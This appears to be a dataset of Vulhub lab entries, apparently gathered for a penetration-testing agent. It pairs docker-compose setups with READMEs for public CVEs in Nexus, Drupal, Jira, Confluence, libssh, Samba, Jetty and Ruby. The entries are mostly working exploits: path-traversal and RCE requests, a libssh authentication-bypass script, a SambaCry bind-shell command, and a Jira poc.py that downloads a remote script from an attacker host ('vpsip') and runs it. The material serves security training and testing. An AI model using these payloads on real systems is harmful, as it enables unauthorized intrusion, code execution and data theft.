    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2024-4956/admin.password\n- /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2024-4956/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2024-4956/admin.password\n\n- Extension: .password\n- Language: unknown\n- Size: 5 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nadmin\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nexus/CVE-2024-4956/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 168 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '3'\nservices:\n web:\n   image: vulhub/nexus:3.68.0\n   ports:\n    - \"8081:8081\"\n    - \"5005:5005\"\n   volumes: \n    - ./admin.password:/nexus-data/admin.password\n\n```\n\n",
    "readme": "# Nexus Repository Manager 3 Unauthenticated Path Traversal (CVE-2024-4956)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nNexus Repository Manager is a repository manager that organizes, stores and distributes artifacts needed for development.\n\nA path traversal vulnerability has been discovered in Nexus Repository 3 before version 3.68.1, the vulnerability allows for an attacker to craft a URL to return any file as a download, including system files outside of Nexus Repository application scope, without any authentication.\n\nReferences:\n\n- <https://support.sonatype.com/hc/en-us/articles/29416509323923-CVE-2024-4956-Nexus-Repository-3-Path-Traversal-2024-05-16>\n\n## Vulnerable environment\n\nExecute following command to start a Nexus Repository Manager version 3.68.0:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, browse `http://your-ip:8081` to see the home page of Nexus.\n\n## Exploit\n\nJust like SpringMVC CVE-2018-1271 from Orange Tsai's [share](https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf), Jetty's `URIUtil.canonicalPath()` also treats the empty string as a directory which is the root cause of this vulnerability:\n\n![](1.png)\n\nSimply send following request to reproduce the issue:\n\n```\nGET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1\nHost: localhost:8081\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36\nConnection: close\nCache-Control: max-age=0\n\n\n```\n\nAs you can see, `/etc/passwd` has been exposed directly:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2018-7600.md",
    "filenamenomd": "CVE-2018-7600",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2018-7600/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2018-7600/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 72 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/drupal:8.5.0\n   ports:\n    - \"8080:80\"\n\n```\n\n",
    "readme": "# Drupal Drupalgeddon 2 Unauthenticated Remote Code Execution (CVE-2018-7600)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nDrupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 allows remote attackers to execute arbitrary code because of an issue affecting multiple subsystems with default or common module configurations including the Form API.\n\nReferences:\n\n- <https://www.drupal.org/sa-core-2018-002>\n- <https://research.checkpoint.com/uncovering-drupalgeddon-2/>\n\n## Vulnerable environment\n\nRun the following command to start a vulnerable Drupal 8.5.0 environment:\n\n```\ndocker compose up -d\n```\n\nAfter the environment is started, visit `http://your-ip:8080/` and you will see the drupal installation page. Complete the drupal installation using the \"standard\" profile. Because there is no mysql environment, you should select sqlite database when installing. Once the installation is complete you are ready to start exploiting it.\n\n## Exploit\n\nReferring to [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py), we can send the following request to drupal:\n\n```\nPOST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1\nHost: your-ip:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 103\n\nform_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id\n```\n\nUpon successful execution of the code, the id command is executed:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2019-11581.md",
    "filenamenomd": "CVE-2019-11581",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jira/CVE-2019-11581/poc.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/jira/CVE-2019-11581/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/jira/CVE-2019-11581/smtpd_server.py\n- /home/yay/pentest-agent/vulhub/sites_no_md/jira/CVE-2019-11581/Dockerfile.smtpd\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jira/CVE-2019-11581/poc.py\n\n- Extension: .py\n- Language: python\n- Size: 1539 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\n# -*- coding: utf-8 -*-\nimport requests\n\nreq = requests.Session()\n\ndef Base(url,subject):\n    print(\"[+] Get Token\")\n    r = req.get(\"%s/secure/ContactAdministrators!default.jspa\" % url)\n    c = r.headers['Set-Cookie']\n    t = c[c.find(\"=\")+1:c.find(\";\")]\n    data = {\n        \"from\": \"test@test.com\",\n        \"subject\": subject,\n        \"details\": \"v\",\n        \"atl_token\": t,\n        \"发送\": \"发送\"\n    }\n    print(\"[+] Token : %s\" % t)\n    print(\"[+] Exploit\")\n    r = req.post(\"%s/secure/ContactAdministrators.jspa\" %\n                 url, data=data, allow_redirects=False)\n    # print(r.status_code)\n\ndef Exp(url, cmd=\"whoami\"):\n    payload = \"\"\"\n#set ($cmd=\"%s\")\n#set ($e=\"exp\")\n#set ($a=$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec($cmd))\n#set ($input=$e.getClass().forName(\"java.lang.Process\").getMethod(\"getInputStream\").invoke($a))\n#set($sc = $e.getClass().forName(\"java.util.Scanner\"))\n#set($constructor = $sc.getDeclaredConstructor($e.getClass().forName(\"java.io.InputStream\")))\n#set($scan=$constructor.newInstance($input).useDelimiter(\"\\\\A\"))\n#if($scan.hasNext())\n    $scan.next()\n#end\n    \"\"\" % cmd\n    Base(url,payload)\n\ndef Poc(url):\n    payload = \"$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami').toString()\"\n    Base(url,payload)\n\nif __name__ == \"__main__\":\n    Poc(\"http://localhost:8080\")\n    Exp(\"http://localhost:8080\",\"curl vpsip/re.sh -o /tmp/re.sh\")\n    Exp(\"http://localhost:8080\",\"sh /tmp/re.sh\")\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jira/CVE-2019-11581/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 176 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  jira:\n    image: vulhub/jira:8.1.0\n    ports:\n      - \"8080:8080\"\n    links:\n      - smtpd\n\n  smtpd:\n    build:\n      context: .\n      dockerfile: Dockerfile.smtpd\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jira/CVE-2019-11581/smtpd_server.py\n\n- Extension: .py\n- Language: python\n- Size: 582 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```python\nimport smtpd\nimport asyncore,sys,time\n\nclass CustomSMTPServer(smtpd.SMTPServer):\n    \n    def process_message(self, peer, mailfrom, rcpttos, data, **kwargs):\n        r = data.decode(\"utf-8\").split(\"\\n\")\n        for l in r:\n            if l.startswith(\"Subject:\"):\n                sys.stdout.write(\"[{0}] {1}\\n\".format(time.time(),l))\n        sys.stdout.flush()\n        return\n\n\n# server = smtpd.DebuggingServer(('0.0.0.0', 1025), None)\nserver = CustomSMTPServer(('0.0.0.0', 1025), None)\n\nsys.stdout.write(\"[+] Start SMTPServer on 0.0.0.0:1025\\n\")\nsys.stdout.flush()\n\nasyncore.loop()\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jira/CVE-2019-11581/Dockerfile.smtpd\n\n- Extension: .smtpd\n- Language: unknown\n- Size: 113 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM python:3.6-alpine3.9\n\nCOPY smtpd_server.py /smtpd_server.py\n\nCMD [\"python\", \"/smtpd_server.py\"]\n\nEXPOSE 1025\n```\n\n",
    "readme": "# Atlassian Jira Template Injection (CVE-2019-11581)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nAtlassian Jira is a widely used project and issue tracking tool in enterprises, commonly applied in defect tracking, customer service, requirements collection, process approval, task tracking, project tracking, and agile management. A template injection vulnerability was discovered in multiple versions that allows remote code execution.\n\nAffected versions include:\n\n- 4.4.x\n- 5.x.x\n- 6.x.x\n- 7.0.x - 7.13.x (Fixed in 7.6.14, 7.13.5)\n- 8.0.x - 8.2.x (Fixed in 8.0.3, 8.1.2, 8.2.3)\n\nReferences:\n\n- <https://confluence.atlassian.com/jira/jira-security-advisory-2019-07-10-973486595.html>\n- <https://jira.atlassian.com/browse/JRASERVER-69532>\n- <https://mp.weixin.qq.com/s/d2yvSyRZXpZrPcAkMqArsw>\n\n## Environment Setup\n\nExecute the following command to start Jira Server 8.1.0:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit `http://your-ip:8080` to begin the installation process:\n\n1. Switch to your preferred language\n2. Choose \"Set it up for me\" (first option)\n3. Apply for a Jira Server test license from Atlassian (do not select Data Center or Addons)\n4. Complete the installation process\n\nNote: Installation may fail or take longer on machines with limited memory. It's recommended to use a machine with at least 4GB of RAM.\n\n![](7.png)\n\nAdd SMTP mail server at `/secure/admin/AddSmtpMailServer!default.jspa`:\n\n![](8.png)\n\nEnable \"Contact Administrators Form\" in System Settings at `/secure/admin/ViewApplicationProperties.jspa`:\n\n![](9.png)\n\nCreate a sample project to complete the setup.\n\n## Vulnerability Reproduction\n\nThe PoC is similar to CVE-2019-3396. You can use the following payload:\n\n```\n$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime', null).invoke(null, null).exec('whoami').toString()\n```\n\nYou can either:\n\n1. Run `poc.py`, or\n2. Submit the PoC directly at `/secure/ContactAdministrators!default.jspa`\n\n![](11.png)\n\n![](12.png)\n\nIf you don't see any data in smtpd, check the email queue at `/secure/admin/MailQueueAdmin!default.jspa`:\n\n![](13.png)\n"
  },
  {
    "filename": "CVE-2021-26084.md",
    "filenamenomd": "CVE-2021-26084",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/confluence/CVE-2021-26084/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/confluence/CVE-2021-26084/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 242 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  web:\n    image: vulhub/confluence:7.4.10\n    ports:\n      - \"8090:8090\"\n    depends_on:\n      - db\n  db:\n    image: postgres:12.8-alpine\n    environment: \n    - POSTGRES_PASSWORD=postgres\n    - POSTGRES_DB=confluence\n\n```\n\n",
    "readme": "# Atlassian Confluence Webwork Pre-Auth OGNL Injection Leads to RCE (CVE-2021-26084)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nConfluence is a web-based corporate wiki developed by Australian software company Atlassian.\n\nAn OGNL injection vulnerability exists that allows an unauthenticated attacker to execute arbitrary code on a Confluence Server or Data Center instance.\n\nReferences\n\n- https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html\n- https://jira.atlassian.com/browse/CONFSERVER-67940\n- https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md\n- https://github.com/h3v0x/CVE-2021-26084_Confluence\n\n## Vulnerable Environment\n\nExecute following command to start a Confluence Server 7.4.10:\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, visit ``http://your-ip:8090`` and you will see the installation guide, select \"Trial installation\", then you will be asked to fill in the license key. You should apply for a Confluence Server test certificate from Atlassian.\n\nFollowing [this guide](https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396) to complete the installation.\n\nOn the database configuration page, fill in the form with database address `db`, database name `confluence`, username `postgres`, password `postgres`.\n\n![](3.png)\n\n## Exploit\n\nThere are multiple API endpoints that are affected by this vulnerability.\n\n### /pages/doenterpagevariables.action\n\nThis is a pre-auth exploit, executing `233*233`:\n\n```\nPOST /pages/doenterpagevariables.action HTTP/1.1\nHost: your-ip:8090\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 47\n\nqueryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027\n```\n\n![](2.png)\n\nExecuting arbitrary commands:\n\n```\nqueryString=%5cu0027%2b%7bClass.forName%28%5cu0027javax.script.ScriptEngineManager%5cu0027%29.newInstance%28%29.getEngineByName%28%5cu0027JavaScript%5cu0027%29.%5cu0065val%28%5cu0027var+isWin+%3d+java.lang.System.getProperty%28%5cu0022os.name%5cu0022%29.toLowerCase%28%29.contains%28%5cu0022win%5cu0022%29%3b+var+cmd+%3d+new+java.lang.String%28%5cu0022id%5cu0022%29%3bvar+p+%3d+new+java.lang.ProcessBuilder%28%29%3b+if%28isWin%29%7bp.command%28%5cu0022cmd.exe%5cu0022%2c+%5cu0022%2fc%5cu0022%2c+cmd%29%3b+%7d+else%7bp.command%28%5cu0022bash%5cu0022%2c+%5cu0022-c%5cu0022%2c+cmd%29%3b+%7dp.redirectErrorStream%28true%29%3b+var+process%3d+p.start%28%29%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3b+var+bufferedReader+%3d+new+java.io.BufferedReader%28inputStreamReader%29%3b+var+line+%3d+%5cu0022%5cu0022%3b+var+output+%3d+%5cu0022%5cu0022%3b+while%28%28line+%3d+bufferedReader.readLine%28%29%29+%21%3d+null%29%7boutput+%3d+output+%2b+line+%2b+java.lang.Character.toString%2810%29%3b+%7d%5cu0027%29%7d%2b%5cu0027\n```\n\n![](1.png)\n\n### /pages/createpage-entervariables.action\n\nThis is also a pre-auth exploit:\n\n```\nPOST /pages/createpage-entervariables.action HTTP/1.1\nHost: your-ip:8090\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 47\n\nqueryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027\n```\n\n### /pages/createpage.action\n\nThis exploit requires a user permission to create pages:\n\n```\nGET /pages/createpage.action?spaceKey=EX&src=quick-create&queryString=%5cu0027%2b%7b233*233%7d%2b%5cu0027 HTTP/1.1\nHost: 192.168.1.162:8090\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://192.168.1.162:8090/template/custom/content-editor.vm\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7\nCookie: JSESSIONID=7B35600F54A9E303CE8C277ED960E1E7; seraph.confluence=524289%3A2ac32a308478b9cb9f0e351a12470faa4f2a928a\nConnection: close\n\n\n```\n"
  },
  {
    "filename": "CVE-2018-10933.md",
    "filenamenomd": "CVE-2018-10933",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/libssh/CVE-2018-10933/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/libssh/CVE-2018-10933/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 85 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n sshd:\n   image: vulhub/libssh:0.8.1\n   ports:\n    - \"2222:22\"\n```\n\n",
    "readme": "# libssh Authentication Bypass Vulnerability(CVE-2018-10933)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nlibssh is a multiplatform C library implementing the SSHv2 protocol on client and server side. A logic vulnerability was found in libssh's server-side state machine. The attacker can send the `MSG_USERAUTH_SUCCESS` message before the authentication succeed. That can bypass the authentication and access the target SSH server.\n\nReferences:\n\n- https://www.libssh.org/security/advisories/CVE-2018-10933.txt\n- https://www.seebug.org/vuldb/ssvid-97614\n\n## Setup\n\nStart the environment:\n\n```\ndocker compose up -d\n```\n\nAfter the environment is started, we can connect the `your-ip:2222` port (account password: `myuser:mypassword`), which is a legal ssh login:\n\n![](1.png)\n\n## Exploit\n\nReferring to the POC given in https://www.seebug.org/vuldb/ssvid-97614, we can use the following script to proof the vulnerability.\n\n```python\n#!/usr/bin/env python3\nimport sys\nimport paramiko\nimport socket\nimport logging\n\nlogging.basicConfig(stream=sys.stdout, level=logging.DEBUG)\nbufsize = 2048\n\n\ndef execute(hostname, port, command):\n    sock = socket.socket()\n    try:\n        sock.connect((hostname, int(port)))\n\n        message = paramiko.message.Message()\n        transport = paramiko.transport.Transport(sock)\n        transport.start_client()\n\n        message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)\n        transport._send_message(message)\n\n        client = transport.open_session(timeout=10)\n        client.exec_command(command)\n\n        # stdin = client.makefile(\"wb\", bufsize)\n        stdout = client.makefile(\"rb\", bufsize)\n        stderr = client.makefile_stderr(\"rb\", bufsize)\n\n        output = stdout.read()\n        error = stderr.read()\n\n        stdout.close()\n        stderr.close()\n\n        return (output+error).decode()\n    except paramiko.SSHException as e:\n        logging.exception(e)\n        logging.debug(\"TCPForwarding disabled on remote server can't connect. Not Vulnerable\")\n    except socket.error:\n        logging.debug(\"Unable to connect.\")\n\n    return None\n\n\nif __name__ == '__main__':\n    print(execute(sys.argv[1], sys.argv[2], sys.argv[3]))\n\n```\n\nYou can execute arbitrary commands on the target server like following:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2017-7494.md",
    "filenamenomd": "CVE-2017-7494",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/samba/CVE-2017-7494/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/samba/CVE-2017-7494/smb.conf\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/samba/CVE-2017-7494/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 176 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n samba:\n   image: vulhub/samba:4.6.3\n   tty: true\n   volumes:\n    - ./smb.conf:/usr/local/samba/etc/smb.conf\n   ports:\n    - \"445:445\"\n    - \"6699:6699\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/samba/CVE-2017-7494/smb.conf\n\n- Extension: .conf\n- Language: ini\n- Size: 200 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```ini\n[global]\n    map to guest = Bad User\n    server string = Samba Server Version %v\n    guest account = nobody\n\n[myshare]\n    path = /home/share\n    read only = no\n    guest ok = yes\n    guest only = yes\n```\n\n",
    "readme": "# Samba Authenticated RCE (CVE-2017-7494, Aka SambaCry)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nSamba is the standard Windows interoperability suite of programs for Linux and Unix, it provides secure, stable and fast file and print services for all clients using the SMB/CIFS protocol.\n\nSamba 3.x after 3.5.0 and 4.x before 4.4.14, 4.5.x before 4.5.10, and 4.6.x before 4.6.4 that is vulnerable to a remote code execution vulnerability named **SambaCry**. CVE-2017–7494 allows remote authenticated users to upload a shared library to a writable shared folder, and perform code execution attacks to take control of servers that host vulnerable Samba services.\n\n## Environment Setup\n\nExecute following commands to start a Samba server 4.6.3:\n\n```\ndocker compose up -d\n```\n\n## Principle\n\nReference to [SambaCry RCE Exploit](https://medium.com/@lucideus/sambacry-rce-exploit-lucideus-research-3a3e5bd9e17c):\n\n> Microsoft Remote Procedure Call (RPC) is a powerful technology for creating distributed client/server programs. RPC is an interprocess communication technique that allows client and server software to communicate.\n>\n> MSRPC protocol allows to connect to a named pipe from remote destination. When trying to open a pipe using MSRPC on Samba, the server verifies the validity of the pipe name using the internal function `is_known_pipename()`.\n>\n> An external RPC server can be set using the 'rpc_server' variable inside smb.conf and then it will handle the pipe request.\n>\n> The function `is_known_pipename()` doesn’t check that the pipe is valid, this allows to use '/' to insert a full path of an arbitrary library.\n\nThe exploitation requirements:\n\n- An anonymous writeable server or an authenticated Samba account\n- A known path of the writeable sharing directory\n\nSee also:\n\n - https://medium.com/@lucideus/sambacry-rce-exploit-lucideus-research-3a3e5bd9e17c\n - https://github.com/opsxcq/exploit-CVE-2017-7494\n - http://bobao.360.cn/learning/detail/3900.html\n\n## Exploit\n\nSamba config ( you can find [here](smb.conf) ) of our target server:\n\n```\n[global]\n    map to guest = Bad User\n    server string = Samba Server Version %v\n    guest account = nobody\n\n[myshare]\n    path = /home/share\n    read only = no\n    guest ok = yes\n    guest only = yes\n```\n\nUse `smbclient` to test connecting:\n\n```\nsmbclient //your-ip/myshare -N\n```\n\n![](02.png)\n\nIf you got connection error, please check your network, especially port 445.\n\nUsing <https://github.com/opsxcq/exploit-CVE-2017-7494> to exploit the server:\n\n```\n./exploit.py -t your-ip -e libbindshell-samba.so -s myshare -r /home/share/libbindshell-samba.so -u guest -p guest -P 6699\n```\n\nSuccessful execute commands:\n\n![](01.png)\n\nPlease note that, metasploit's `exploit/linux/samba/is_known_pipename` is tested failed since XX(I don't know) version, and I am really sure that it works on Jun 2017.\n"
  },
  {
    "filename": "CVE-2021-34429.md",
    "filenamenomd": "CVE-2021-34429",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-34429/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-34429/src/index.jsp\n- /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-34429/src/WEB-INF/web.xml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-34429/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 146 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2.2'\nservices:\n  web:\n    image: vulhub/jetty:9.4.40\n    ports:\n      - \"8080:8080\"\n    volumes: \n      - ./src:/opt/jetty/webapps/ROOT\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-34429/src/index.jsp\n\n- Extension: .jsp\n- Language: unknown\n- Size: 1375 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\n\n<!doctype html>\n<html>\n<head>\n    <title>Example Domain</title>\n\n    <meta charset=\"utf-8\" />\n    <meta http-equiv=\"Content-type\" content=\"text/html; charset=utf-8\" />\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\n    <style type=\"text/css\">\n        body {\n            background-color: #f0f0f2;\n            margin: 0;\n            padding: 0;\n            font-family: -apple-system, system-ui, BlinkMacSystemFont, \"Segoe UI\", \"Open Sans\", \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n            \n        }\n        div {\n            width: 600px;\n            margin: 5em auto;\n            padding: 2em;\n            background-color: #fdfdff;\n            border-radius: 0.5em;\n            box-shadow: 2px 3px 7px 2px rgba(0,0,0,0.02);\n        }\n        a:link, a:visited {\n            color: #38488f;\n            text-decoration: none;\n        }\n        @media (max-width: 700px) {\n            div {\n                margin: 0 auto;\n                width: auto;\n            }\n        }\n    </style>\n</head>\n\n<body>\n<div>\n    <h1><% out.println(\"Example Domain\"); %></h1>\n    <p>This domain is for use in illustrative examples in documents. You may use this\n    domain in literature without prior coordination or asking for permission.</p>\n    <p><a href=\"https://www.iana.org/domains/example\">More information...</a></p>\n</div>\n</body>\n</html>\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/jetty/CVE-2021-34429/src/WEB-INF/web.xml\n\n- Extension: .xml\n- Language: xml\n- Size: 215 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```xml\n<!DOCTYPE web-app PUBLIC\n \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\"\n \"http://java.sun.com/dtd/web-app_2_3.dtd\" >\n\n<web-app>\n  <display-name>Archetype Created Web Application</display-name>\n</web-app>\n\n```\n\n",
    "readme": "# Jetty Ambiguous Paths Information Disclosure Vulnerability (CVE-2021-34429)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nEclipse Jetty is a Java web server and Java Servlet container.\n\nJetty 9.4.40 fixed an ambiguous paths information disclosure vulnerability [CVE-2021-28164](https://github.com/vulhub/vulhub/tree/master/jetty/CVE-2021-28164), CVE-2021-34429 is a variation and bypass of it.\n\nThere are 3 types of payload that exfiltrate the content of `WEB-INF/web.xml`:\n\n- Unicode based URL encoded: `/%u002e/WEB-INF/web.xml`\n- `\\0` with `.` bug:  `/.%00/WEB-INF/web.xml`\n- `\\0` with `..` bug: `/a/b/..%00/WEB-INF/web.xml`\n\nThe vulnerability affects the Jetty 9.4.37-9.4.42, 10.0.1-10.0.5, 11.0.1-11.0.5.\n\nReferences:\n\n- https://github.com/eclipse/jetty.project/security/advisories/GHSA-vjv5-gp2w-65vm\n- https://xz.aliyun.com/t/10039\n\n## Vulnerable Application\n\nExecute the following command to start a Jetty 9.4.40 server.\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, visit ``http://your-ip:8080`` to see an example page.\n\n## Exploit\n\nThe sensitive file web.xml is not accessible through `/WEB-INF/web.xml`.\n\n![](1.png)\n\nUse payload `/%u002e/WEB-INF/web.xml` to bypass the restriction:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2017-17405.md",
    "filenamenomd": "CVE-2017-17405",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ruby/CVE-2017-17405/web.rb\n- /home/yay/pentest-agent/vulhub/sites_no_md/ruby/CVE-2017-17405/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ruby/CVE-2017-17405/web.rb\n\n- Extension: .rb\n- Language: ruby\n- Size: 582 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```ruby\nrequire 'sinatra'\nrequire 'net/ftp'\nrequire 'uri'\n\nget '/' do\n    'Use /download?uri=ftp://127.0.0.1:2121/&file=/path/to/file.txt to download a ftp file.'\nend\n\nget '/download' do\n    content_type 'application/octet-stream'\n\n    begin\n        uri = URI.parse(params['uri'])\n\n        ftp = Net::FTP.new \n        ftp.connect(uri.host, uri.port)\n        ftp.login(uri.user || 'anonymous', uri.password)\n        ftp.getbinaryfile(params['file'])\n        ftp.close\n    rescue\n        return '404 Not Found'\n    end\n\n    File.open(params['file'], 'rb') {|f|\n        return f.read\n    }\nend\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ruby/CVE-2017-17405/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 196 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/ruby:2.4.1\n   command: ruby web.rb -p 8080 -o 0.0.0.0\n   working_dir: /usr/src\n   volumes:\n    - ./web.rb:/usr/src/web.rb\n   ports:\n    - \"8080:8080\"\n\n```\n\n",
